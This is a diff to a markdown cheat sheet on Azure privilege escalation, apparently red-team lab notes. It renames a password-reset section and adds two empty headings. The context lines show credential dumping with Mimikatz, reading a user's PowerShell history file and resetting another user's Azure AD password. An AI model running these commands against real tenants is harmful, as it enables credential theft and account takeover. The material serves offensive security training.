@@ -7,7 +7,9 @@
   * [Keyvault](#Keyvault)
   * [Mimikatz](#Mimikatz)
   * [Powershell History](#Powershell-History)
-* [Reset password](#Reset-password)
+* [Reset password of other users](#Reset-password-of-other-users)
+* [Arm Templates History](#Arm-Templates-History)
+* [Function apps continuous deployment](#Function-apps-continuous-deployment)
 
 ## Privesc enumeration
 #### Get context of current user
@@ -239,7 +241,7 @@ Invoke-Mimikayz -Dumpcreds
 type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-## Reset password
+## Reset password of other users
 - Reset password if user has "authentication administrator" role on a group or administrative unit.
 
 ```
@@ -247,3 +249,12 @@ $password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Fo
 (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
 ```
 
+## Arm Templates History
+```
+
+```
+
+## Function apps continuous deployment
+```
+
+```
